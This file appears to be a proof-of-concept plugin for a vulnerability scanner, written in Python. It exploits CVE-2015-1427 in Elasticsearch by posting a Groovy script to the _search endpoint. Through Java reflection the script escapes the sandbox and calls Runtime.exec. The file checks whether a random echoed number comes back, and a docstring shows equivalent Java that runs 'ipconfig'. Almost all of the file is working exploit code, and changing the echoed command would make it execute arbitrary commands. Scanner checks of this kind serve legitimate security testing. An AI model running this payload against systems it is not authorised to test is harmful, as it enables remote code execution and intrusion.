#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import random
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.ELASTICSEARCH
        self.name = 'CVE-2015-1427'
        self.keyword = ['elasticsearch']
        self.info = 'elasticsearch rce (CVE-2015-1427)'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        '''
        其中JAVA等价于：
        String s1 = new java.util.Scanner(Runtime.getRuntime().exec("ipconfig").getInputStream()).useDelimiter("\\A").next();
        //A means "start of string", and \z means "end of string".
        String s2  = new java.util.Scanner(Runtime.getRuntime().exec("ipconfig").getInputStream()).next();
        System.out.println(s1)
        '''
        await self.get_url()
        if self.base_url:
            ran = str(random.randint(100000, 999999))
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            _data = '''
            {
                "size":1,
                "script_fields": {
                    "test#": {
                        "script":
                            "java.lang.Math.class.forName(\\"java.io.BufferedReader\\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"echo '''+ ran + '''\\").getInputStream())).readLines()",
                        "lang": "groovy"
                    }
                }
            }
            '''
            async with ClientSession() as session:
                url = self.base_url + '_search?pretty'
                async with session.post(url=url, headers=headers, data=_data) as res:
                    if res != None:
                        text = await res.text()
                        if ran in text:
                            self.flag = 1
                            self.req.append({"url": url})
                            self.res.append({"info": url, "key": "CVE-2015-1427"})
